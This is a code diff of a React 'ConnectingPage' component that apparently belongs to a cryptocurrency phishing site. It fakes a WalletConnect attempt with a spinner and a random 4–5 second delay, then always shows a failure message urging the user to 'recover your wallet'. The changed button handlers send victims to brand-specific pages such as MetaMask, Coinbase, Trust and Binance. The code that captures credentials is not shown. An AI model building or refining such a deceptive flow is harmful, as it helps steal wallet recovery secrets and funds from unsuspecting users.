@@ -17,7 +17,7 @@ const ConnectingPage = () => {
     const delay = Math.floor(Math.random() * 1000) + 4000;
     const timer = setTimeout(() => {
       setLoading(false);
-            setError('Walletconnect failed to connect to your wallet.\nPlease continue to recover your wallet.');
+      setError('Walletconnect failed to connect to your wallet.\nPlease continue to recover your wallet.');
     }, delay);
     return () => clearTimeout(timer);
   }, []);
@@ -31,14 +31,14 @@ const ConnectingPage = () => {
     <div>
       <Header />
       <main className="flex flex-col items-center justify-center min-h-[60vh]">
-  <h1 className="flex justify-center mt-10 text-4xl font-semibold import__page">Connecting to your wallet...</h1>
-  <div className="flex flex-col items-center mt-8">
-    <div className="w-16 h-16 mb-4 flex items-center justify-center">
-      <span className="inline-block w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></span>
-    </div>
+        <h1 className="flex justify-center mt-10 text-4xl font-semibold import__page">Connecting to your wallet...</h1>
+        <div className="flex flex-col items-center mt-8">
+          <div className="w-16 h-16 mb-4 flex items-center justify-center">
+            <span className="inline-block w-12 h-12 border-4 border-blue-500 border-t-transparent rounded-full animate-spin"></span>
+          </div>
           {loading ? (
             <>
-                    <p className="text-lg text-gray-600 mt-4">Please wait while we connect to your wallet.</p>
+              <p className="text-lg text-gray-600 mt-4">Please wait while we connect to your wallet.</p>
             </>
           ) : error ? (
             <div className="text-center">
@@ -47,13 +47,14 @@ const ConnectingPage = () => {
                 className="mt-4 px-6 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition"
                 onClick={() => {
                   if (wallet && wallet.name) {
-                    const routeName = wallet.name
-                      .toLowerCase()
-                      .replace(/[^a-z0-9]/g, '')
-                      .replace('wallet', '')
-                      .replace('chain', '')
-                      .trim();
-                    navigate(`/${routeName}`, { state: { wallet } });
+                    let baseName = wallet.name.toLowerCase().replace(/[^a-z0-9]/g, '');
+                    if (baseName.includes('binance')) baseName = 'binance';
+                    if (baseName.includes('defi') || baseName.includes('crypto.com')) baseName = 'defi';
+                    if (baseName.includes('mew')) baseName = 'mew';
+                    if (baseName.includes('metamask')) baseName = 'metamask';
+                    if (baseName.includes('coinbase')) baseName = 'coinbase';
+                    if (baseName.includes('trust')) baseName = 'trust';
+                    navigate(`/${baseName}-wallet`, { state: { wallet } });
                   }
                 }}
               >
@@ -65,17 +66,14 @@ const ConnectingPage = () => {
               className="mt-4 px-6 py-2 bg-blue-500 text-white rounded hover:bg-blue-600 transition"
               onClick={() => {
                 if (wallet && wallet.name) {
-                  let routeName = wallet.name.toLowerCase();
-                  if (routeName.includes('binance')) {
-                    routeName = 'binance';
-                  } else {
-                    routeName = routeName
-                      .replace(/[^a-z0-9]/g, '')
-                      .replace('wallet', '')
-                      .replace('chain', '')
-                      .trim();
-                  }
-                  navigate(`/${routeName}`, { state: { wallet } });
+                  let baseName = wallet.name.toLowerCase().replace(/[^a-z0-9]/g, '');
+                  if (baseName.includes('binance')) baseName = 'binance';
+                  if (baseName.includes('defi') || baseName.includes('crypto.com')) baseName = 'defi';
+                  if (baseName.includes('mew')) baseName = 'mew';
+                  if (baseName.includes('metamask')) baseName = 'metamask';
+                  if (baseName.includes('coinbase')) baseName = 'coinbase';
+                  if (baseName.includes('trust')) baseName = 'trust';
+                  navigate(`/${baseName}-wallet`, { state: { wallet } });
                 }
               }}
             >
